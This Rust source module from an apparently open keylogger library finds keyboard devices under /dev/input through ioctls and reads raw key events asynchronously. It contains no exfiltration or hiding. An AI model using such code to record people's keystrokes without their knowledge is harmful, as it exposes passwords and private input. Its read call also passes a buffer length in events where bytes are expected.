use std::convert::TryFrom;
use std::fs::{self, File};
use std::io;
use std::mem;
use std::os::unix::fs::FileTypeExt;
use std::os::unix::io::{AsRawFd, RawFd};
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::sync::Arc;
use std::task::{Context, Poll};

use futures::ready;
use tokio::io::unix::AsyncFd;

use crate::error::KeyloggerError;
use crate::keyboard::event_codes::{EV_KEY, EV_MSC, EV_REP, EV_SYN};
use crate::keyboard::{KeyEvent, KeyEventResult, KeyEventSource, Keyboard, KeyboardDevice};
use crate::KeyloggerResult;

const IOC_NRBITS: libc::c_ulong = 8;
const IOC_TYPEBITS: libc::c_ulong = 8;
const IOC_SIZEBITS: libc::c_ulong = 14;
const IOC_NRSHIFT: libc::c_ulong = 0;
const IOC_TYPESHIFT: libc::c_ulong = IOC_NRSHIFT + IOC_NRBITS;
const IOC_SIZESHIFT: libc::c_ulong = IOC_TYPESHIFT + IOC_TYPEBITS;
const IOC_DIRSHIFT: libc::c_ulong = IOC_SIZESHIFT + IOC_SIZEBITS;
const IOC_READ: libc::c_ulong = 2;

#[derive(Debug)]
pub(crate) struct InputDevice {
    /// The name of the device.
    pub(crate) name: String,
    /// The path of the input device (e.g. `/dev/input/event0`).
    pub(crate) device: PathBuf,
    /// The file descriptor of the open input device file.
    pub(crate) async_fd: Arc<AsyncFd<File>>,
}

impl TryFrom<&Path> for InputDevice {
    type Error = KeyloggerError;

    fn try_from(device: &Path) -> Result<Self, Self::Error> {
        let file = File::open(device)?;
        let flags = read_event_flags(&file)?;

        if !has_keyboard_flags(flags) {
            return Err(KeyloggerError::NotAKeyboard(device.into()));
        }

        set_nonblocking(&file)?;

        let name = read_name(&file)?;

        Ok(Self {
            name,
            device: device.into(),
            async_fd: Arc::new(AsyncFd::new(file)?),
        })
    }
}

impl AsRawFd for InputDevice {
    fn as_raw_fd(&self) -> RawFd {
        self.async_fd.as_raw_fd()
    }
}

impl KeyEventSource for InputDevice {
    fn name(&self) -> &str {
        &self.name
    }

    fn path(&self) -> &Path {
        self.device.as_path()
    }

    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<KeyEventResult> {
        loop {
            let this = self.as_ref();
            let mut guard = ready!(this.async_fd.poll_read_ready(cx))?;

            match guard.try_io(|inner| read_key_events(inner.as_raw_fd())) {
                Ok(result) => return Poll::Ready(result.map_err(Into::into)),
                Err(_) => continue,
            }
        }
    }
}

/// Read [`libc::input_event`s](libc::input_event) from the specified file descriptor.
pub(crate) fn read_key_events(fd: RawFd) -> io::Result<Vec<KeyEvent>> {
    let evs = read_input_events(fd)?
        .iter()
        .filter_map(|e| KeyEvent::try_from(e).ok())
        .collect::<Vec<_>>();

    if evs.is_empty() {
        return Err(io::Error::new(io::ErrorKind::WouldBlock, "no key events"));
    }

    Ok(evs)
}

fn read_input_events(fd: impl Into<RawFd>) -> io::Result<Vec<libc::input_event>> {
    const MAX_INPUT_EV: usize = 128;

    let mut input_events = [mem::MaybeUninit::<libc::input_event>::uninit(); MAX_INPUT_EV];

    let n = unsafe { libc::read(fd.into(), input_events.as_mut_ptr() as *mut _, MAX_INPUT_EV) };

    if n < 0 {
        return Err(io::Error::last_os_error());
    }

    let n = (n as usize) / mem::size_of::<libc::input_event>();

    // The first n elements of the array are initialized:
    Ok(input_events[..n]
        .iter()
        .map(|e| unsafe { e.assume_init() })
        .collect())
}

/// Auto-detect the keyboard devices to watch.
pub fn find_keyboards() -> KeyloggerResult<Vec<KeyboardDevice>> {
    let keyboards = find_keyboard_devices()?.collect::<Vec<_>>();

    Ok(keyboards)
}

/// Find all available keyboard devices.
fn find_keyboard_devices() -> KeyloggerResult<impl Iterator<Item = KeyboardDevice>> {
    Ok(find_char_devices()?.filter_map(|entry| {
        Some(KeyboardDevice(Keyboard::new(
            InputDevice::try_from(entry.as_path()).ok()?,
        )))
    }))
}

/// Set the `O_NONBLOCK` flag for the specified file descriptor.
pub(crate) fn set_nonblocking(f: &File) -> KeyloggerResult<()> {
    let res = unsafe { libc::fcntl(f.as_raw_fd(), libc::F_SETFL, libc::O_NONBLOCK) };

    if res < 0 {
        return Err(io::Error::last_os_error().into());
    }

    Ok(())
}

/// Read the name of the specified keyboard device using the `EVIOCGNAME` ioctl.
fn read_name(f: &File) -> KeyloggerResult<String> {
    const DEVICE_NAME_MAX_LEN: usize = 512;

    let mut device_name = [0u8; DEVICE_NAME_MAX_LEN];

    let eviocgname = (IOC_READ << IOC_DIRSHIFT)
        | (('E' as libc::c_ulong) << IOC_TYPESHIFT)
        | (0x06 << IOC_NRSHIFT)
        | ((device_name.len() as libc::c_ulong) << IOC_SIZESHIFT);

    ioctl(
        f.as_raw_fd(),
        eviocgname,
        device_name.as_mut_ptr() as *mut libc::c_ulong,
    )?;

    Ok(String::from_utf8_lossy(&device_name).into())
}

/// Read the features supported by the specified device using the `EVIOCGBIT` ioctl.
fn read_event_flags(f: &File) -> KeyloggerResult<libc::c_ulong> {
    let mut ev_flags: libc::c_ulong = 0;

    let eviocgbit = (IOC_READ << IOC_DIRSHIFT)
        | (('E' as libc::c_ulong) << IOC_TYPESHIFT)
        | (0x20 << IOC_NRSHIFT)
        | (((mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << IOC_SIZESHIFT);

    ioctl(
        f.as_raw_fd(),
        eviocgbit,
        (&mut ev_flags) as *mut libc::c_ulong,
    )?;

    Ok(ev_flags)
}

/// Check whether the specified `flags` indicate the device is a keyboard.
fn has_keyboard_flags(flags: libc::c_ulong) -> bool {
    const KEYBOARD_FLAGS: libc::c_ulong =
        (1 << EV_SYN) | (1 << EV_KEY) | (1 << EV_MSC) | (1 << EV_REP);

    (flags & KEYBOARD_FLAGS) == KEYBOARD_FLAGS
}

/// Get all character devices from `/dev/input`.
fn find_char_devices() -> KeyloggerResult<impl Iterator<Item = PathBuf>> {
    const INPUT_DIR: &str = "/dev/input";

    Ok(fs::read_dir(INPUT_DIR)?.filter_map(|entry| {
        let entry = entry.ok()?;
        let file_type = fs::metadata(entry.path()).ok()?.file_type();

        if file_type.is_char_device() {
            Some(entry.path())
        } else {
            None
        }
    }))
}

fn ioctl(fd: RawFd, request: libc::c_ulong, buf: *mut libc::c_ulong) -> KeyloggerResult<()> {
    let res = unsafe { libc::ioctl(fd, request, buf) };

    if res < 0 {
        Err(io::Error::last_os_error().into())
    } else {
        Ok(())
    }
}
